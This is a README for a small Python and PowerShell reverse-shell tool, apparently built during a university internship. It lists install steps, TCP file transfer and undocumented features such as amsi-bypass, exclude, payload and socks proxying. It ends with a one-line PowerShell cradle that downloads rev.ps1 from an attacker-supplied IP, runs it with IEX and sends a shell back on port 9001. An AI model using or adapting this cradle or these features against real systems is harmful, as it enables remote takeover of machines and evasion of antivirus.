# Introduction

A small reverse shell project that i build during my university intership.\
It is written with Python and Powershell. To simply install it:

1.  Clone this repo
2.  Run the following code to install all the requirements
    ```
    pip install -r requirements.txt
    ```
3.  Run the following code to make the .py file executable or simply run it with python
    ```
    chmod +x powerrevshell.py or python3 powerrevshell.py
    ```
## Powerrevshell

![powerrevshell-start](https://user-images.githubusercontent.com/82824055/170969038-c81c54a0-721b-44f5-835b-86d11840211f.png)

Powerrevshell.py comes with several function accesibbile via the "menu" option.

### get - put

The get and put functionality are build using TCPSocket to transfer files between the machines, to prevent data loss, on each message, are sent support text and md5sum to know if the actual file option are sent correctly.

```
get <file.txt> / put <file.txt>
```

### smb-get
### down-file
### load
### amsi-bypass
### exclude
### payload
### socks-start
### socks-stop
### socks
### close


## Rev.ps1

Rev.ps1 is the powershell script to connect back to us.\
To start the reverse shell run the following code on the target machine.

```
(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p 9001
```
